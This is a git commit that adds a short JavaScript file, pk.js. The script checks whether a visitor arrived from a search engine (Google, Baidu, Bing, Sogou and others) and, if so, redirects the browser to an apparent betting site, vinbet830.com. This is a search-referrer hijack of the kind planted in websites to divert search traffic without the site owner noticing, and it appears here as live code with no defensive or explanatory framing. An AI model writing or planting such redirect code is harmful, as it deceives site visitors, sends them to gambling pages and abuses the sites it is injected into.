185fcacbea3be998e4b2d6220c932064486eb990
bc598 <bc598@outlook.com>
2017-06-03 18:07:57 +0800

    Create pk.js

---
+++ pk.js
@@ -0,0 +1,5 @@
+
+var s=document.referrer;
+if(s.indexOf("google")>0 || s.indexOf("baidu")>0 || s.indexOf("so")>0 || s.indexOf("haosou")>0 || s.indexOf("sogou")>0 || s.indexOf("bing")>0){
+location.href="http://m.vinbet830.com/mobile/";
+}
